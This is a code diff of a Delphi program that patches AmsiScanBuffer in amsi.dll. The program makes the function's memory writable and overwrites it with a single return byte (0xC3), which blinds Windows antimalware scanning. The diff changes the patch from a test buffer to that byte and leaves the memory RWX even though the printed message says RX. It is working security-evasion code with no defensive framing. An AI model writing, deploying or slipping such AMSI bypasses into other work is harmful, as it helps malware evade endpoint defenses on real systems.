@@ -11,30 +11,20 @@ https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constant
 }
 
 uses
-  SysUtils,
+  System.SysUtils,
   Windows
   ;
 
 var
   PidHandle: integer;
   PidID : integer;
-
-
-
-  dataout,datain:TBytes;
   Written: UIntPtr;
 
   lib : THandle;
   asb : Pointer;
   NumWrote : SIZE_T;
   OldProtect : DWord;
-
-
-
-
-  //garbage : Byte = $C3;
-  garbage : Array[0..15] of byte = ($41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41);
-
+  garbage : Byte = $C3;
 
 type UIntPtr = NativeUInt;
 
@@ -51,19 +41,21 @@ begin
     lib := LoadLibrary('amsi.dll');
     asb := GetProcAddress(lib,'AmsiScanBuffer');
     WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
+    //amsi.dll base address at   0000-7FF9-E16E-35E0
+    //ScanStringBuffer Loaded at 0000-0000-0000-25e0 inside RX region of 2nd image
 
 
   //Change memory protection to RWX
     VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
     WriteLn('[+] RWX protected');
 
-  //4C 8B DC found    @   0000 1d50
+
   //Write to memory @ pter
     WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
     WriteLn('[+] Written To amsi.dll');
 
   //Change memory protection to RWX
-    VirtualProtect(asb, SizeOf(garbage), 16, OldProtect);
+    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
     WriteLn('[+] RX protected');
 
 
